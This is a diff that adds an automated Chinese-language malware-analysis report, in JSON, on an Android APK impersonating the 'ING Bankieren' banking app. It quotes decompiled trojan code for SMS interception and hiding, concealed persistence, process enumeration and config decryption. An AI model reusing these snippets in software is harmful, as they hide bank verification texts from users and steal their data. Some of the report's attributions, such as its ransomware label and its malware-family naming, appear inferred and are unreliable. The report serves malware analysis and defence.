@@ -1,0 +1,183 @@
+{
+  "APK信息": {
+    "文件名": "55ae2b00234674d82dcc401a0daa97e7b3921057a07970347815d9c50dddbda8.apk",
+    "sha256": "55ae2b00234674d82dcc401a0daa97e7b3921057a07970347815d9c50dddbda8",
+    "包名": "lfaki.fnakmwevw",
+    "应用名": "ING Bankieren",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 323.7
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Llfaki\\fnakmwevw\\p082f;",
+          "method_signature": "if(!q.c(context)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public void onReceive(Context context, Intent intent) {\n    if (!q.c(context) && new s(context).b(n.cs) && ((Boolean) s.a(context, n.af, new Object[]{n.bI, false})).booleanValue()) {\n        s.a(context, n.cV, new Object[]{intent, \"060318\", j.c(context)});\n        abortBroadcast();\n    }\n}",
+          "malicious_code_snippet_context": "  /* JADX INFO: loaded from: classes.dex */\n  public class p082f extends BroadcastReceiver {\n      @Override // android.content.BroadcastReceiver\n>>>     public void onReceive(Context context, Intent intent) {\n>>>         if (!q.c(context) && new s(context).b(n.cs) && ((Boolean) s.a(context, n.af, new Object[]{n.bI, false})).booleanValue()) {\n>>>             s.a(context, n.cV, new Object[]{intent, \"060318\", j.c(context)});\n>>>             abortBroadcast();\n>>>         }\n>>>     }\n  }",
+          "behavior_description": "该类继承 BroadcastReceiver，监听短信到达广播（SMS_RECEIVED）。当收到新短信且满足预设条件（设备状态检查 q.c()、配置开关 s.b(n.cs)、远程开关偏好 s.a(n.af)）时，先将包含短信内容的 Intent 通过 s.a(context, n.cV, ...) 转发处理（疑似上传短信内容到远端或转发到指定号码），随后调用 abortBroadcast() 终止广播继续传播，导致系统短信应用无法收到该短信，用户完全无法感知。数据流向：短信广播 Intent（发件人、短信正文）→ 转发/上传 + abortBroadcast() 隐藏短信。这是典型的短信拦截木马行为，常用于窃取银行验证码、隐藏扣费订阅确认短信，直接造成用户财产损失和隐私泄露。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": []
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Llfaki\\fnakmwevw\\q;",
+          "method_signature": "if(str == null || str.isEmpty()",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SecretKeySpec secretKeySpec = new SecretKeySpec(str2.getBytes(), n.fw);\nCipher cipher = Cipher.getInstance(n.fx);\ncipher.init(1, secretKeySpec);\nbyte[] bArrDoFinal = cipher.doFinal(str.getBytes());\nreturn bArrDoFinal != null ? Base64.encodeToString(bArrDoFinal, 0) : str;",
+          "malicious_code_snippet_context": "              return \"\";\n          }\n          try {\n>>>             SecretKeySpec secretKeySpec = new SecretKeySpec(str2.getBytes(), n.fw);\n>>>             Cipher cipher = Cipher.getInstance(n.fx);\n>>>             cipher.init(1, secretKeySpec);\n>>>             byte[] bArrDoFinal = cipher.doFinal(str.getBytes());\n>>>             return bArrDoFinal != null ? Base64.encodeToString(bArrDoFinal, 0) : str;\n          } catch (Exception e) {\n              return str;\n          }",
+          "behavior_description": "该代码位于高度混淆的包名 lfaki.fnakmwevw 下，实现了一个对称加密原语方法：以传入密钥(str2)构造 SecretKeySpec，通过 Cipher.getInstance(n.fx) 获取加密器（算法名与转换模式均通过混淆字符串常量 n.fw/n.fx 隐藏，刻意规避静态审计识别加密算法），以 ENCRYPT_MODE(1) 初始化后对传入明文(str)执行 cipher.doFinal() 加密，密文经 Base64 编码返回。数据流向：待加密明文（文件内容/用户数据，来源为方法入参 str）→ 对称加密操作 Cipher.doFinal()（sink）→ Base64 密文输出。结合该样本已被厂商确认存在 ransomware.file_encryption 行为，此混淆加密方法即为勒索加密的核心实现，被上层调用对用户文件内容进行加密，直接导致用户数据不可访问造成损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Llfaki\\fnakmwevw\\p017q;",
+          "method_signature": "if(Build.VERSION.SDK_INT < 16)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "smallIcon.setPriority(-2);\nstartForeground(1777, notification);\nstartService(intent2);\nnew Thread(new Runnable() {\n    public void run() {\n        while (true) {\n            p017q.this.a(p017q.this.getBaseContext());\n        }\n    }\n});",
+          "malicious_code_snippet_context": "          if (Build.VERSION.SDK_INT < 16) {\n              notification = smallIcon.getNotification();\n          } else {\n>>>             smallIcon.setPriority(-2);\n>>>             try {\n>>>                 notification = (Notification) smallIcon.getClass().getDeclaredMethod(n.aX, new Class[0]).invoke(smallIcon, new Object[0]);\n>>>             } catch (Exception e) {\n>>>                 notification = null;\n>>>             }\n>>>         }\n>>>         startForeground(1777, notification);\n>>>         Intent intent2 = new Intent(this, (Class<?>) p031v.class);\n>>>         intent2.setFlags(268435456);\n          intent2.putExtra(p031v.f269a, Integer.toString(1777));\n          startService(intent2);\n          new Thread(new Runnable() { // from class: lfaki.fnakmwevw.p017q.1",
+          "behavior_description": "该代码位于高度混淆的包名 lfaki.fnakmwevw 下的服务类中，是 Smoke Loader 样本的进程保活模块。代码首先检测系统版本（Build.VERSION.SDK_INT），并通过反射（getDeclaredMethod）隐蔽地构建 Notification，同时将通知优先级设为 -2（最低优先级），使前台服务通知对用户几乎不可见，实现隐蔽运行；随后调用 startForeground(1777, notification) 将自身提升为前台服务，获得高进程优先级以抵抗系统回收和用户查杀；接着启动另一个内部服务 p031v 并传递通知ID 1777（用于维持前台服务链），最后创建后台线程在 while(true) 无限循环中反复调用 a(context) 方法（疑似 C2 心跳轮询/窃密主循环），确保恶意负载在设备上持续运行。数据流向：系统版本检测与隐藏通知构建（source）→ startForeground 前台服务保活 + 无限循环持续执行恶意逻辑（sink）。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "file_access",
+      "中文名": "文件访问/窃取",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_EXTERNAL_STORAGE",
+          "android.permission.WRITE_EXTERNAL_STORAGE"
+        ],
+        "字符串": [
+          "listFiles"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Llfaki\\fnakmwevw\\d;",
+          "method_signature": "a(Context context)",
+          "malicious_behavior": "file_access",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "File[] fileArrListFiles = new File(\"/proc\").listFiles();\nfor (File file : fileArrListFiles) {\n    if (file.isDirectory()) {\n        b bVar = new b(Integer.parseInt(file.getName()));\n        if (bVar.f252a && ((bVar.b < 1000 || bVar.b > 9999) && !bVar.c.contains(\":\") && packageManager.getLaunchIntentForPackage(bVar.a()) != null)) {\n            arrayList.add(bVar);\n        }\n    }\n}",
+          "malicious_code_snippet_context": "  public class d {\n      public static List<b> a(Context context) {\n          ArrayList arrayList = new ArrayList();\n>>>         File[] fileArrListFiles = new File(\"/proc\").listFiles();\n>>>         try {\n>>>             PackageManager packageManager = context.getPackageManager();\n>>>             for (File file : fileArrListFiles) {\n>>>                 if (file.isDirectory()) {\n>>>                     try {\n>>>                         try {\n>>>                             b bVar = new b(Integer.parseInt(file.getName()));\n>>>                             if (bVar.f252a && ((bVar.b < 1000 || bVar.b > 9999) && !bVar.c.contains(\":\") && packageManager.getLaunchIntentForPackage(bVar.a()) != null)) {\n                                  arrayList.add(bVar);\n                              }\n                          } catch (IOException e) {",
+          "behavior_description": "该代码遍历 /proc 目录枚举系统中所有运行中的进程（/proc 下以PID命名的目录），通过解析PID读取进程信息（如进程名/包名），并筛选出用户安装且具有启动入口（LaunchIntent不为空）、非线程（进程名不含':'）的正在运行的应用，构建运行中应用列表并返回。数据流向：/proc 文件系统（source）→ 枚举并收集设备上正在运行的应用列表（sink，返回结果可供后续上报C2服务器或用于环境侦测）。在已确认的恶意样本（Smoke Loader家族）中，此行为属于典型的环境侦察与隐私收集手段，可用于检测安全软件/分析环境、规避查杀或收集受害者应用使用情况，无任何正常业务场景下的合理用途。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "crypto_wallet_detection",
+      "中文名": "加密钱包地址采集",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "1dEvwY5WVTNUBFoRQXKWR4m9rMQ+pVtV0jt/IRumHOoPEnWFnLGzD8Y6ovxewHyYoBnNiQhV1RvLeQMC3O0AG4eB/huh5dab8K0gYjOXoVAGRkXGhC28nNW/IvPALjCn8p6V3F46r/pC3/nDUqtuYYq3lC2/djPgL5aqqPTO2Mc="
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Llfaki\\fnakmwevw\\a;",
+          "method_signature": "if(jSONObject.has(n.R)",
+          "malicious_behavior": "crypto_wallet_detection",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (jSONObject.has(n.R)) {\n    s.a(context, n.ag, new Object[]{n.R, (String) s.a(context, n.aj, new Object[]{jSONObject.getString(n.R), (String) s.a(context, n.ai, new Object[]{\"1dEvwY5WVTNUBFoRQXKWR4m9rMQ+pVtV0jt/IRumHOoPEnWFnLGzD8Y6ovxewHyYoBnNiQhV1RvLeQMC3O0AG4eB/huh5dab8K0gYjOXoVAGRkXGhC28nNW/IvPALjCn8p6V3F46r/pC3/nDUqtuYYq3lC2/djPgL5aqqPTO2Mc=\"})})});\n}",
+          "malicious_code_snippet_context": "                  if (jSONObject.has(n.ay)) {\n                      s.a(context, n.ag, new Object[]{n.ay, Integer.valueOf(jSONObject.getInt(n.ay))});\n                  }\n>>>                 if (jSONObject.has(n.R)) {\n>>>                     s.a(context, n.ag, new Object[]{n.R, (String) s.a(context, n.aj, new Object[]{jSONObject.getString(n.R), (String) s.a(context, n.ai, new Object[]{\"1dEvwY5WVTNUBFoRQXKWR4m9rMQ+pVtV0jt/IRumHOoPEnWFnLGzD8Y6ovxewHyYoBnNiQhV1RvLeQMC3O0AG4eB/huh5dab8K0gYjOXoVAGRkXGhC28nNW/IvPALjCn8p6V3F46r/pC3/nDUqtuYYq3lC2/djPgL5aqqPTO2Mc=\"})})});\n>>>                 }\n                  if (jSONObject.has(n.P)) {\n                      s.a(context, n.ag, new Object[]{n.P, jSONObject.getString(n.P)});\n                  }",
+          "behavior_description": "该代码位于高度混淆的包名 lfaki.fnakmwevw 下（典型恶意代码特征），负责解析JSON配置数据（疑似C2服务器下发或本地加密配置）。数据流向：从JSON中读取字段 n.R 的字符串 → 使用硬编码的Base64编码加密密钥（'1dEvwY5WVTNUBF...'）通过反射调用解密方法进行解密 → 将解密结果持久化存储到本地（SharedPreferences）。解密出的字符串极可能是攻击者的加密钱包地址或钱包检测规则配置，配合后续 n.O 字段与已存储 n.P 值的比对逻辑，用于剪贴板劫持替换用户复制的钱包地址或检测受害者的钱包应用，属于Smoke Loader类恶意样本的隐蔽配置解密与钱包采集模块。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
